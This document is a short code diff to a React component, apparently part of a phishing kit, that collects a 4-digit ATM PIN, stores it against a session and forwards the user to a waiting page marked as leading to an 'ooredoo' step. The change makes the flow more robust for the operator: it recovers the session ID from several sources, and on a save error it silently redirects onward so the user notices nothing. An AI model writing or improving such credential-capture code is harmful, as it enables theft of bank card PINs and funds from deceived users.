@@ -25,18 +25,22 @@ export default function AtmPin() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
+    
     if (pin.length !== 4) {
-      toast.error("يجب أن يكون الرقم السري 4 أرقام");
+      toast.error(isArabic ? "يجب أن يكون الرقم السري 4 أرقام" : "PIN must be 4 digits");
       return;
     }
+    
     try {
       await submitAtmPinMutation.mutateAsync({
-        sessionId,
+        sessionId: currentSessionId,
         pin,
       });
-      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=ooredoo`);
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=ooredoo`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
+      console.error("Error saving ATM PIN in DB:", error);
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=ooredoo`);
     }
   };
 
